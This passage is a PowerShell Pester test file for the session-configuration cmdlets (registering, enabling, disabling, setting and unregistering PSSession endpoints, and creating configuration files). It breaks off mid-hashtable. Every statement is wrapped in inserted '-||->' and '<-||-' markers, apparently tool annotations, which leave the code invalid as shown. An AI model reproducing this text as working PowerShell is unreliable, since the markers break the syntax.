


 -||-> Import-Module HelpersCommon <-||- 

 -||-> try
{
    
     -||-> $originalDefaultParameterValues = $PSDefaultParameterValues.Clone() <-||- 
     -||-> $originalWarningPreference = $WarningPreference <-||- 
     -||-> $WarningPreference = "SilentlyContinue" <-||- 
    
     -||-> $IsNotSkipped = ( -||-> $IsWindows -and $IsCoreCLR -and ( -||-> Test-IsElevated <-||- ) -and ( -||-> Test-CanWriteToPsHome <-||- ) <-||- ) <-||- 
     -||-> $PSDefaultParameterValues["it:skip"] = !$IsNotSkipped <-||- 

    
    
    
    
    
    
     -||-> if ( -||-> $IsNotSkipped <-||- )
    {
         -||-> $endpointName = "PowerShell.$( -||-> $psversiontable.GitCommitId <-||- )" <-||- 

         -||-> $matchedEndpoint =  -||-> Get-PSSessionConfiguration $endpointName -ErrorAction SilentlyContinue <-||-  <-||- 

         -||-> if ( -||-> $matchedEndpoint -eq $null <-||- )
        {
            
            
            
            
             -||-> Enable-PSRemoting -SkipNetworkProfileCheck <-||- 
             -||-> $endpointCreated = $true <-||- 
        } <-||- 
    } <-||- 

     -||-> try
    {
         -||-> Describe "Validate Register-PSSessionConfiguration" -Tags @( -||-> "CI", 'RequireAdminOnWindows' <-||- ) {

             -||-> AfterAll {
                 -||-> if ( -||-> $IsNotSkipped <-||- )
                {
                     -||-> Get-PSSessionConfiguration -Name "ITTask*" -ErrorAction SilentlyContinue | Unregister-PSSessionConfiguration <-||- 
                } <-||- 
            } <-||- 

             -||-> It "Register-PSSessionConfiguration -TransportOption" {

                 -||-> $ConfigurationName = "ITTask" + ( -||-> Get-Random -Minimum 10000 -Maximum 99999 <-||- ) <-||- 
                 -||-> $Transport =  -||-> New-PSTransportOption -MaxSessions 40 -IdleTimeoutSec 3600 <-||-  <-||- 

                 -||-> $null =  -||-> Register-PSSessionConfiguration -Name $ConfigurationName -TransportOption $Transport <-||-  <-||- 
                 -||-> $result =  -||-> Get-PSSessionConfiguration -Name $ConfigurationName <-||-  <-||- 

                 -||-> $result.MaxShells | Should -Be 40 <-||- 
                 -||-> $result.IdleTimeoutms | Should -Be 3600000 <-||- 
            } <-||- 
        } <-||- 
         -||-> Describe "Validate Get-PSSessionConfiguration, Enable-PSSessionConfiguration, Disable-PSSessionConfiguration, Unregister-PSSessionConfiguration cmdlets" -Tags @( -||-> "CI", 'RequireAdminOnWindows' <-||- ) {

             -||-> BeforeAll {
                 -||-> if ( -||-> $IsNotSkipped <-||- )
                {
                    
                     -||-> function RegisterNewConfiguration {
                        param (

                            [string]
                            $Name,

                            [string]
                            $ConfigFilePath,

                            [switch]
                            $Enabled
                        )

                         -||-> $TestConfig =  -||-> Get-PSSessionConfiguration -Name $Name -ErrorAction SilentlyContinue <-||-  <-||- 
                         -||-> if( -||-> $TestConfig <-||- )
                        {
                             -||-> $null =  -||-> Unregister-PSSessionConfiguration -Name $Name <-||-  <-||- 
                        } <-||- 

                         -||-> if( -||-> $Enabled <-||- )
                        {
                             -||-> $null =  -||-> Register-PSSessionConfiguration -Name $Name -Path $ConfigFilePath <-||-  <-||- 
                        }
                        else
                        {
                             -||-> $null =  -||-> Register-PSSessionConfiguration -Name $Name -Path $ConfigFilePath -AccessMode Disabled <-||-  <-||- 
                        } <-||- 
                    } <-||- 

                    
                     -||-> function UnregisterPSSessionConfiguration{
                        param (

                            [string]
                            $Name
                        )

                         -||-> Unregister-PSSessionConfiguration -Name $Name -Force -NoServiceRestart -ErrorAction SilentlyContinue <-||- 
                    } <-||- 

                    
                     -||-> function CreateTestConfigFile {

                         -||-> $TestConfigFileLoc =  -||-> Join-Path $TestDrive "Remoting" <-||-  <-||- 
                         -||-> if( -||-> -not ( -||-> Test-path $TestConfigFileLoc <-||- ) <-||- )
                        {
                             -||-> $null =  -||-> New-Item -Path $TestConfigFileLoc -ItemType Directory -Force -ErrorAction Stop <-||-  <-||- 
                        } <-||- 

                         -||-> $TestConfigFile =  -||-> Join-Path $TestConfigFileLoc "TestConfigFile.pssc" <-||-  <-||- 
                         -||-> $null =  -||-> New-PSSessionConfigurationFile -Path $TestConfigFile -SessionType Default <-||-  <-||- 

                        return  -||-> $TestConfigFile <-||- 
                    } <-||- 

                     -||-> $LocalConfigFilePath =  -||-> CreateTestConfigFile <-||-  <-||- 

                     -||-> $expectedPSVersion = "$( -||-> $PSVersionTable.PSVersion.Major <-||- ).$( -||-> $PSVersionTable.PSVersion.Minor <-||- )" <-||- 
                } <-||- 
            } <-||- 

             -||-> Context "Validate Get-PSSessionConfiguration cmdlet" {

                 -||-> It "Get-PSSessionConfiguration with no parameter" {

                     -||-> $Result =  -||-> Get-PSSessionConfiguration <-||-  <-||- 

                     -||-> $Result.Name -contains $endpointName | Should -BeTrue <-||- 
                     -||-> $Result.PSVersion -contains $expectedPSVersion | Should -BeTrue <-||- 
                } <-||- 

                 -||-> It "Get-PSSessionConfiguration with Name parameter" {

                     -||-> $Result =  -||-> Get-PSSessionConfiguration -Name $endpointName <-||-  <-||- 

                     -||-> $Result.Name | Should -BeExactly $endpointName <-||- 
                     -||-> $Result.PSVersion | Should -BeExactly $expectedPSVersion <-||- 
                } <-||- 

                 -||-> It "Get-PSSessionConfiguration -Name with wildcard character" {

                     -||-> $endpointWildcard = "powershell.*" <-||- 

                     -||-> $Result =  -||-> Get-PSSessionConfiguration -Name $endpointWildcard <-||-  <-||- 

                     -||-> $Result.Name -contains $endpointName | Should -BeTrue <-||- 
                     -||-> $Result.PSVersion -contains $expectedPSVersion | Should -BeTrue <-||- 
                } <-||- 

                 -||-> It "Get-PSSessionConfiguration -Name with Non-Existent session configuration" {
                     -||-> {  -||-> Get-PSSessionConfiguration -Name "NonExistantSessionConfiguration" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "Microsoft.PowerShell.Commands.WriteErrorException" <-||- 
                } <-||- 
            } <-||- 

             -||-> Context "Validate Enable-PSSessionConfiguration and Disable-PSSessionConfiguration" {

                 -||-> function VerifyEnableAndDisablePSSessionConfig {
                    param (
                        [string]
                        $SessionConfigName,

                        [string]
                        $ConfigFilePath,

                        [Bool]
                        $InitialSessionStateEnabled,

                        [Bool]
                        $FinalSessionStateEnabled,

                        [string]
                        $TestDescription,

                        [bool]
                        $EnablePSSessionConfig
                    )

                     -||-> It "$TestDescription" {

                         -||-> RegisterNewConfiguration -Name $SessionConfigName -ConfigFilePath $ConfigFilePath -Enabled:$InitialSessionStateEnabled <-||- 

                         -||-> $TestConfigStateBeforeChange = ( -||-> Get-PSSessionConfiguration -Name $SessionConfigName <-||- ).Enabled <-||- 

                         -||-> if( -||-> $EnablePSSessionConfig <-||- )
                        {
                             -||-> $isSkipNetworkCheck = $true <-||- 
                            
                            
                             -||-> Enable-PSSessionConfiguration -Name $SessionConfigName -NoServiceRestart -SkipNetworkProfileCheck:$isSkipNetworkCheck <-||- 
                        }
                        else
                        {
                             -||-> Disable-PSSessionConfiguration -Name $SessionConfigName -NoServiceRestart <-||- 
                        } <-||- 

                         -||-> $TestConfigStateAfterChange = ( -||-> Get-PSSessionConfiguration -Name $SessionConfigName -ErrorAction SilentlyContinue <-||- ).Enabled <-||- 

                         -||-> UnregisterPSSessionConfiguration -Name $SessionConfigName <-||- 

                         -||-> $TestConfigStateBeforeChange | Should -Be "$InitialSessionStateEnabled" <-||- 
                         -||-> $TestConfigStateAfterChange | Should -Be "$FinalSessionStateEnabled" <-||- 
                    } <-||- 
                } <-||- 

                 -||-> $TestData = @(
                     -||-> @{
                        SessionConfigName =  -||-> "TestDisablePSSessionConfig" <-||- 
                        ConfigFilePath =  -||-> $LocalConfigFilePath <-||- 
                        InitialSessionStateEnabled =  -||-> $true <-||- 
                        FinalSessionStateEnabled =  -||-> $false <-||- 
                        TestDescription =  -||-> "Validate Disable-Configuration cmdlet" <-||- 
                        EnablePSSessionConfig =  -||-> $false <-||- 
                    } <-||- 

                     -||-> @{
                        SessionConfigName =  -||-> "TestEnablePSSessionConfig" <-||- 
                        ConfigFilePath =  -||-> $LocalConfigFilePath <-||- 
                        InitialSessionStateEnabled =  -||-> $false <-||- 
                        FinalSessionStateEnabled =  -||-> $true <-||- 
                        TestDescription =  -||-> "Validate Enable-Configuration cmdlet" <-||- 
                        EnablePSSessionConfig =  -||-> $true <-||- 
                    } <-||- 
                ) <-||- 

                 -||-> foreach ($testcase in  -||-> $testData <-||- )
                {
                     -||-> VerifyEnableAndDisablePSSessionConfig @testcase <-||- 
                } <-||- 
            } <-||- 

             -||-> Context "Validate Unregister-PSSessionConfiguration cmdlet" {

                 -||-> BeforeEach {
                     -||-> Register-PSSessionConfiguration -Name "TestUnregisterPSSessionConfig" <-||- 
                } <-||- 

                 -||-> AfterAll {
                     -||-> if ( -||-> $IsNotSkipped <-||- )
                    {
                         -||-> Unregister-PSSessionConfiguration -name "TestUnregisterPSSessionConfig" -ErrorAction SilentlyContinue | Out-Null <-||- 
                    } <-||- 
                } <-||- 

                 -||-> function TestUnRegisterPSSsessionConfiguration {

                    param ($Description, $SessionConfigName, $ExpectedOutput, $ExpectedError)

                     -||-> It "$Description" {

                         -||-> $Result = [PSObject] @{Output =  -||-> $true <-||-  ; Error =  -||-> $null <-||- } <-||- 
                         -||-> $Error.Clear() <-||- 
                         -||-> try
                        {
                             -||-> $null =  -||-> Unregister-PSSessionConfiguration -name $SessionConfigName -ErrorAction stop <-||-  <-||- 
                        }
                        catch
                        {
                             -||-> $Result.Error = $_.Exception <-||- 
                        } <-||- 

                         -||-> if( -||-> -not $Result.Error <-||- )
                        {
                             -||-> $ValidEndpoints = [PSObject]@( -||-> Get-PSSessionConfiguration <-||- ) <-||- 

                             -||-> foreach ($endpoint in  -||-> $ValidEndpoints <-||- )
                            {
                                
                                
                                 -||-> if( -||-> $endpoint.name -like $SessionConfigName <-||- )
                                {
                                     -||-> $Result.Output = $false <-||- 
                                    break
                                } <-||- 
                            } <-||- 
                        }
                        else
                        {
                             -||-> $Result.Output = $false <-||- 
                        } <-||- 

                         -||-> $Result.Output | Should -Match $ExpectedOutput <-||- 
                         -||-> $Result.Error | Should -Match $ExpectedError <-||- 
                    } <-||- 
                } <-||- 

                 -||-> $TestData = @(
                     -||-> @{
                        Description =  -||-> "Validate Unregister-PSSessionConfiguration with -name parameter" <-||- 
                        SessionConfigName =  -||-> "TestUnregisterPSSessionConfig" <-||- 
                        ExpectedOutput =  -||-> $true <-||- 
                        ExpectedError =  -||-> $null <-||- 
                    } <-||- 
                     -||-> @{
                        Description =  -||-> "Validate Unregister-PSSessionConfiguration with name having wildcard character" <-||- 
                        SessionConfigName =  -||-> "TestUnregister*" <-||- 
                        ExpectedOutput =  -||-> $true <-||- 
                        ExpectedError =  -||-> $null <-||- 
                    } <-||- 
                     -||-> @{
                        Description =  -||-> "Validate Unregister-PSSessionConfiguration for non-existant endpoint" <-||- 
                        SessionConfigName =  -||-> 'TestInvalidEndPoint' <-||- 
                        ExpectedOutput =  -||-> $false <-||- 
                        ExpectedError =  -||-> "No session configuration matches criteria `"TestInvalidEndPoint`"." <-||- 
                    } <-||- 
                ) <-||- 

                 -||-> foreach ($TestCase in  -||-> $TestData <-||- )
                {
                     -||-> TestUnRegisterPSSsessionConfiguration @TestCase <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> Describe "Validate Register-PSSessionConfiguration, Set-PSSessionConfiguration cmdlets" -Tags @( -||-> "Feature", 'RequireAdminOnWindows' <-||- ) {

             -||-> BeforeAll {
                 -||-> if ( -||-> $IsNotSkipped <-||- )
                {
                     -||-> $expectedPSVersion = "$( -||-> $PSVersionTable.PSVersion.Major <-||- ).$( -||-> $PSVersionTable.PSVersion.Minor <-||- )" <-||- 

                     -||-> function ValidateRemoteEndpoint {
                        param ($TestSessionConfigName, $ScriptToExecute, $ExpectedOutput)

                         -||-> $Result = [PSObject]@{Output=  -||-> $null <-||- ; Error =  -||-> $null <-||- } <-||- 
                         -||-> try
                        {
                             -||-> $sn =  -||-> New-PSSession . -ConfigurationName $TestSessionConfigName -ErrorAction Stop <-||-  <-||- 
                             -||-> if( -||-> $sn <-||- )
                            {
                                 -||-> if( -||-> $ScriptToExecute <-||- )
                                {
                                     -||-> $Result.Output =  -||-> invoke-command -Session $Sn -ScriptBlock { param ($scripttoExecute)  -||-> Invoke-Expression $scripttoExecute <-||- } -ArgumentList $ScriptToExecute <-||-  <-||- 
                                }
                                else
                                {
                                     -||-> $Result.Output = $true <-||- 
                                } <-||- 
                            }
                            else
                            {
                                throw  -||-> "Unable to create session $TestSessionConfigName" <-||- 
                            } <-||- 
                        }
                        catch
                        {
                             -||-> $Result.Error = $_.Error.FullyQualifiedErrorId <-||- 
                        }
                        finally
                        {
                             -||-> if ( -||-> $sn <-||- )
                            {
                                 -||-> Remove-PSSession $sn -ErrorAction SilentlyContinue | Out-Null <-||- 
                                 -||-> $sn = $null <-||- 
                            } <-||- 
                        } <-||- 
                         -||-> $Result.Output | Should -Be $ExpectedOutput <-||- 
                         -||-> $Result.Error | Should -BeNullOrEmpty <-||- 
                    } <-||- 

                    
                     -||-> function CreateStartupScript {
                         -||-> $ScriptContent = @"
`$script:testvariable = "testValue"
"@ <-||- 

                         -||-> $TestScript =  -||-> Join-Path $script:TestDir "StartupTestScript.ps1" <-||-  <-||- 
                         -||-> $null =  -||-> Set-Content -path $TestScript -Value $ScriptContent <-||-  <-||- 

                        return  -||-> $TestScript <-||- 
                    } <-||- 

                    
                     -||-> function CreateTestConfigFile {

                         -||-> $TestConfigFile =  -||-> Join-Path $script:TestDir "TestConfigFile.pssc" <-||-  <-||- 
                         -||-> $null =  -||-> New-PSSessionConfigurationFile -Path $TestConfigFile -SessionType Default <-||-  <-||- 
                        return  -||-> $TestConfigFile <-||- 
                    } <-||- 

                     -||-> function CreateTestModule {
                         -||-> $ScriptContent = @"
function IsTestModuleImported {
return `$true
}
Export-ModuleMember IsTestModuleImported
"@ <-||- 
                         -||-> $TestModuleFileLoc = $script:TestDir <-||- 

                         -||-> if( -||-> -not ( -||-> Test-path $TestModuleFileLoc <-||- ) <-||- )
                        {
                             -||-> $null =  -||-> New-Item -Path $TestModuleFileLoc -ItemType Directory -Force -ErrorAction Stop <-||-  <-||- 
                        } <-||- 

                         -||-> $TestModuleFile =  -||-> Join-Path $TestModuleFileLoc "TestModule.psm1" <-||-  <-||- 
                         -||-> $null =  -||-> Set-Content -path $TestModuleFile -Value $ScriptContent <-||-  <-||- 

                        return  -||-> $TestModuleFile <-||- 
                    } <-||- 

                     -||-> function CreateTestAssembly {
                         -||-> $PscConfigDef = @"
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Automation.Remoting;

namespace PowershellTestConfigNamespace
{
    public sealed class PowershellTestConfig : PSSessionConfiguration
    {
        /// <summary>
        ///
        /// </summary>
        /// <param name="senderInfo"></param>
        /// <returns></returns>
        public override InitialSessionState GetInitialSessionState(PSSenderInfo senderInfo)
        {
            return InitialSessionState.CreateDefault();
        }

    }
}
"@ <-||- 
                         -||-> $script:SourceFile =  -||-> Join-Path $script:TestAssemblyDir "PowershellTestConfig.cs" <-||-  <-||- 
                         -||-> $PscConfigDef | out-file $script:SourceFile -Encoding ascii -Force <-||- 
                         -||-> $TestAssemblyName = "TestAssembly.dll" <-||- 
                         -||-> $TestAssemblyPath =  -||-> Join-Path $script:TestAssemblyDir $TestAssemblyName <-||-  <-||- 
                         -||-> Add-Type -path $script:SourceFile -OutputAssembly $TestAssemblyPath <-||- 
                        return  -||-> $TestAssemblyName <-||- 
                    } <-||- 

                     -||-> $script:TestDir =  -||-> Join-Path $TestDrive "Remoting" <-||-  <-||- 
                     -||-> if( -||-> -not ( -||-> Test-Path $script:TestDir <-||- ) <-||- )
                    {
                         -||-> $null =  -||-> New-Item -path $script:TestDir -ItemType Directory <-||-  <-||- 
                    } <-||- 

                     -||-> $script:TestAssemblyDir =  -||-> Join-Path $TestDrive "AssemblyDir" <-||-  <-||- 
                     -||-> if( -||-> -not ( -||-> Test-Path $script:TestAssemblyDir <-||- ) <-||- )
                    {
                         -||-> $null =  -||-> New-Item -path $script:TestAssemblyDir -ItemType Directory <-||-  <-||- 
                    } <-||- 

                     -||-> $LocalConfigFilePath =  -||-> CreateTestConfigFile <-||-  <-||- 
                     -||-> $LocalStartupScriptPath =  -||-> CreateStartupScript <-||-  <-||- 
                     -||-> $LocalTestModulePath =  -||-> CreateTestModule <-||-  <-||- 
                     -||-> $LocalTestAssemblyName =  -||-> CreateTestAssembly <-||-  <-||- 
                } <-||- 
            } <-||- 

             -||-> Context "Validate Register-PSSessionConfiguration" {

                 -||-> BeforeAll {
                     -||-> if ( -||-> $IsNotSkipped <-||- )
                    {
                         -||-> $TestSessionConfigName = "TestRegisterPSSesionConfig" <-||- 
                         -||-> Unregister-PSSessionConfiguration -Name $TestSessionConfigName -Force -NoServiceRestart -ErrorAction SilentlyContinue <-||- 
                    } <-||- 
                } <-||- 

                 -||-> AfterEach {
                     -||-> Unregister-PSSessionConfiguration -Name $TestSessionConfigName -Force -NoServiceRestart -ErrorAction SilentlyContinue <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration -name -path" {

                     -||-> $pssessionthreadoptions = "UseCurrentThread" <-||- 
                     -||-> $psmaximumreceivedobjectsizemb = 20 <-||- 
                     -||-> $psmaximumreceiveddatasizepercommandmb = 20 <-||- 
                     -||-> $UseSharedProcess = $true <-||- 

                     -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -path $LocalConfigFilePath -MaximumReceivedObjectSizeMB $psmaximumreceivedobjectsizemb -MaximumReceivedDataSizePerCommandMB $psmaximumreceiveddatasizepercommandmb -UseSharedProcess:$UseSharedProcess -ThreadOptions $pssessionthreadoptions <-||- 
                     -||-> $Result = [PSObject]@{Session =  -||-> Get-PSSessionConfiguration -Name $TestSessionConfigName <-||- ; Culture =  -||-> ( -||-> Get-Item WSMan:\localhost\Plugin\$endpointName\lang -ErrorAction SilentlyContinue <-||- ).value <-||- } <-||- 

                     -||-> $Result.Session.Name | Should -Be $TestSessionConfigName <-||- 
                     -||-> $Result.Session.SessionType | Should -Be "Default" <-||- 
                     -||-> $Result.Session.PSVersion | Should -BeExactly $expectedPSVersion <-||- 
                     -||-> $Result.Session.Enabled | Should -BeTrue <-||- 
                     -||-> $Result.Session.lang | Should -Be $Result.Culture <-||- 
                     -||-> $Result.Session.pssessionthreadoptions | Should -Be $pssessionthreadoptions <-||- 
                     -||-> $Result.Session.psmaximumreceivedobjectsizemb | Should -Be $psmaximumreceivedobjectsizemb <-||- 
                     -||-> $Result.Session.psmaximumreceiveddatasizepercommandmb | Should -Be $psmaximumreceiveddatasizepercommandmb <-||- 
                     -||-> $Result.Session.UseSharedProcess | Should -Be $UseSharedProcess <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration -PSVersion" {

                     -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -PSVersion 5.1 <-||- 
                     -||-> $Session =  -||-> Get-PSSessionConfiguration -Name $TestSessionConfigName <-||-  <-||- 

                     -||-> $Session.Name | Should -Be $TestSessionConfigName <-||- 
                     -||-> $Session.PSVersion | Should -BeExactly 5.1 <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration -startupscript parameter" -Pending {

                     -||-> $null =  -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -path $LocalConfigFilePath -StartupScript $LocalStartupScriptPath -Force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute "return `$script:testvariable" -ExpectedOutput "testValue" -ExpectedError $null <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration -AccessMode parameter" {

                     -||-> $null =  -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -path $LocalConfigFilePath -AccessMode Disabled -Force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute $null -ExpectedOutput $null -ExpectedError "RemoteConnectionDisallowed,PSSessionOpenFailed" <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration -ModulesToImport parameter" -Pending {

                     -||-> $null =  -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -ModulesToImport $LocalTestModulePath -Force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute "return IsTestModuleImported" -ExpectedOutput $true -ExpectedError $null <-||- 
                } <-||- 

                 -||-> It "Validate Register-PSSessionConfiguration with ApplicationBase, AssemblyName and ConfigurationTypeName parameter" -Pending {

                     -||-> $null =  -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName -ApplicationBase $script:TestAssemblyDir -AssemblyName $LocalTestAssemblyName -ConfigurationTypeName "PowershellTestConfigNamespace.PowershellTestConfig" -force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute $null -ExpectedOutput $true -ExpectedError $null <-||- 
                } <-||- 
            } <-||- 

             -||-> Context "Validate Set-PSSessionConfiguration" {

                 -||-> BeforeAll {
                     -||-> if ( -||-> $IsNotSkipped <-||- )
                    {
                         -||-> $TestSessionConfigName = "TestSetPSSesionConfig" <-||- 
                         -||-> Unregister-PSSessionConfiguration -Name $TestSessionConfigName -Force -NoServiceRestart -ErrorAction SilentlyContinue <-||- 
                    } <-||- 
                } <-||- 

                 -||-> AfterEach {
                     -||-> Unregister-PSSessionConfiguration -Name $TestSessionConfigName -Force -NoServiceRestart -ErrorAction SilentlyContinue <-||- 
                } <-||- 

                 -||-> BeforeEach {
                     -||-> Register-PSSessionConfiguration -Name $TestSessionConfigName <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration -name -path -MaximumReceivedObjectSizeMB -MaximumReceivedDataSizePerCommandMB -UseSharedProcess -ThreadOptions parameters" {

                     -||-> $pssessionthreadoptions = "UseCurrentThread" <-||- 
                     -||-> $psmaximumreceivedobjectsizemb = 20 <-||- 
                     -||-> $psmaximumreceiveddatasizepercommandmb = 20 <-||- 
                     -||-> $UseSharedProcess = $true <-||- 

                     -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -MaximumReceivedObjectSizeMB $psmaximumreceivedobjectsizemb -MaximumReceivedDataSizePerCommandMB $psmaximumreceiveddatasizepercommandmb -UseSharedProcess:$UseSharedProcess -ThreadOptions $pssessionthreadoptions -NoServiceRestart <-||- 
                     -||-> $Result = [PSObject]@{Session =  -||-> ( -||-> Get-PSSessionConfiguration -Name $TestSessionConfigName <-||- ) <-||-  ; Culture =  -||-> ( -||-> Get-Item WSMan:\localhost\Plugin\microsoft.powershell\lang -ErrorAction SilentlyContinue <-||- ).value <-||- } <-||- 

                     -||-> $Result.Session.Name | Should -Be $TestSessionConfigName <-||- 
                     -||-> $Result.Session.PSVersion | Should -BeExactly $expectedPSVersion <-||- 
                     -||-> $Result.Session.Enabled | Should -BeTrue <-||- 
                     -||-> $Result.Session.lang | Should -Be $result.Culture <-||- 
                     -||-> $Result.Session.pssessionthreadoptions | Should -Be $pssessionthreadoptions <-||- 
                     -||-> $Result.Session.psmaximumreceivedobjectsizemb | Should -Be $psmaximumreceivedobjectsizemb <-||- 
                     -||-> $Result.Session.psmaximumreceiveddatasizepercommandmb | Should -Be $psmaximumreceiveddatasizepercommandmb <-||- 
                     -||-> $Result.Session.UseSharedProcess | Should -Be $UseSharedProcess <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration -PSVersion" {

                     -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -PSVersion 5.1 <-||- 
                     -||-> $Session = ( -||-> Get-PSSessionConfiguration -Name $TestSessionConfigName <-||- ) <-||- 

                     -||-> $Session.Name | Should -Be $TestSessionConfigName <-||- 
                     -||-> $Session.PSVersion | Should -BeExactly 5.1 <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration -startupscript parameter" -Pending {

                     -||-> $null =  -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -StartupScript $LocalStartupScriptPath <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute "return `$script:testvariable" -ExpectedOutput "testValue" -ExpectedError $null <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration -AccessMode parameter" {

                     -||-> $null =  -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -AccessMode Disabled <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute $null -ExpectedOutput $null -ExpectedError "RemoteConnectionDisallowed,PSSessionOpenFailed" <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration -ModulesToImport parameter" -Pending {

                     -||-> $null =  -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -ModulesToImport $LocalTestModulePath -Force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute "return IsTestModuleImported" -ExpectedOutput $true -ExpectedError $null <-||- 
                } <-||- 

                 -||-> It "Validate Set-PSSessionConfiguration with ApplicationBase, AssemblyName and ConfigurationTypeName parameter" -Pending {

                     -||-> $null =  -||-> Set-PSSessionConfiguration -Name $TestSessionConfigName -ApplicationBase $script:TestAssemblyDir -AssemblyName $LocalTestAssemblyName -ConfigurationTypeName "PowershellTestConfigNamespace.PowershellTestConfig" -force <-||-  <-||- 

                     -||-> ValidateRemoteEndpoint -TestSessionConfigName $TestSessionConfigName -ScriptToExecute $null -ExpectedOutput $true -ExpectedError $null <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    }
    finally
    {
         -||-> if ( -||-> $endpointCreated <-||- )
        {
             -||-> Get-PSSessionConfiguration $endpointName -ErrorAction SilentlyContinue | Unregister-PSSessionConfiguration <-||- 
        } <-||- 
    } <-||- 

     -||-> Describe "Basic tests for New-PSSessionConfigurationFile Cmdlet" -Tags @( -||-> "CI", 'RequireAdminOnWindows' <-||- ) {

         -||-> It "Validate New-PSSessionConfigurationFile can successfully create a valid PSSessionConfigurationFile" {

             -||-> $configFilePath =  -||-> Join-Path $TestDrive "SamplePSSessionConfigurationFile.pssc" <-||-  <-||- 
             -||-> try
            {
                 -||-> New-PSSessionConfigurationFile $configFilePath <-||- 
                 -||-> $result =  -||-> Get-Content $configFilePath | Out-String <-||-  <-||- 
            }
            finally
            {
                 -||-> if( -||-> Test-Path $configFilePath <-||- ){  -||-> Remove-Item $configFilePath -Force <-||-  } <-||- 
            } <-||- 

             -||-> $resultContent =  -||-> invoke-expression ( -||-> $result <-||- ) <-||-  <-||- 
             -||-> $resultContent | Should -BeOfType "System.Collections.Hashtable" <-||- 

            
            
             -||-> $resultContent.ContainsKey("SessionType") -and $resultContent.ContainsKey("SchemaVersion") -and $resultContent.ContainsKey("Guid") -and $resultContent.ContainsKey("Author") | Should -BeTrue <-||- 
        } <-||- 
    } <-||- 

     -||-> Describe "Feature tests for New-PSSessionConfigurationFile Cmdlet" -Tags @( -||-> "Feature", 'RequireAdminOnWindows' <-||- ) {

         -||-> It "Validate FullyQualifiedErrorId from New-PSSessionConfigurationFile when invalid path is provided as input" {
             -||-> {  -||-> New-PSSessionConfigurationFile "cert:\foo.pssc" <-||-  } |
		Should -Throw -ErrorId "InvalidPSSessionConfigurationFilePath,Microsoft.PowerShell.Commands.NewPSSessionConfigurationFileCommand" <-||- 
        } <-||- 
    } <-||- 

     -||-> Describe "Test suite for Test-PSSessionConfigurationFile Cmdlet" -Tags @( -||-> "CI", 'RequireAdminOnWindows' <-||- ) {

         -||-> BeforeAll {
             -||-> if ( -||-> $IsNotSkipped <-||- )
            {
                 -||-> $parmMap = @{
                    
                    PowerShellVersion =  -||-> '3.0' <-||- 
                    SessionType =  -||-> 'Default' <-||- 
                    Author =  -||-> 'User' <-||- 
                    CompanyName =  -||-> 'Microsoft Corporation' <-||- 
                    Copyright =  -||-> 'Copyright (c) Microsoft Corporation. All rights reserved.' <-||- 
                    Description =  -||-> 'This is a sample session configuration file.' <-||- 
                    GUID =  -||-> '73cba863-aa49-4cbf-9917-269ddcf2b1e3' <-||- 
                    SchemaVersion =  -||-> '1.0.0.0' <-||- 

                    
                    
                    
                    EnvironmentVariables =  -||-> @{
                        PSModulePath =  -||-> '$Env:PSModulePath + ";$env:SystemDrive\ProgramData"' <-||- ;
                        SCRATCH =  -||-> "\\SomeValidRemoteShare\SharedLocation" <-||- 
                    } <-||- 

                    
                    
                    
                    
                    AssembliesToLoad =  -||-> 'SomeValidBinary.dll' <-||- 

                    
                    ModulesToImport =  -||-> 'SomeValidModule' <-||- 
                    AliasDefinitions =  -||-> @(
                         -||-> @{
                            Name =  -||-> "gh" <-||- ;
                            Value =  -||-> "Get-Help" <-||- ;
                            Description =  -||-> "Gets the help" <-||- ;
                            Options =  -||-> "AllScope" <-||- ;
                        },
                        @{
                            Name =  -||-> "sh" <-||- ;
                            Value =  -||-> "Save-Help" <-||- ;
                            Description =  -||-> "Saves the help" <-||- ;
                            Options =  -||-> "Private" <-||- ;
                        },
                        @{
                            Name =  -||-> "uh" <-||- ;
                            Value =  -||-> "Update-Help" <-||- ;
                            Description =  -||-> "Updates the help" <-||- ;
                            Options =  -||-> "ReadOnly" <-||- ;
                        } <-||- 
                    ) <-||- 
                    FunctionDefinitions= -||-> @(
                         -||-> @{
                            Name =  -||-> "sysmodules" <-||- ;
                            ScriptBlock =  -||-> 'pushd $pshome\Modules' <-||- ;
                            Options =  -||-> "AllScope" <-||- ;
                        },
                        @{
                            Name =  -||-> "mymodules" <-||- ;
                            ScriptBlock =  -||-> 'pushd $home\Documents\WindowsPowerShell\Modules' <-||- ;
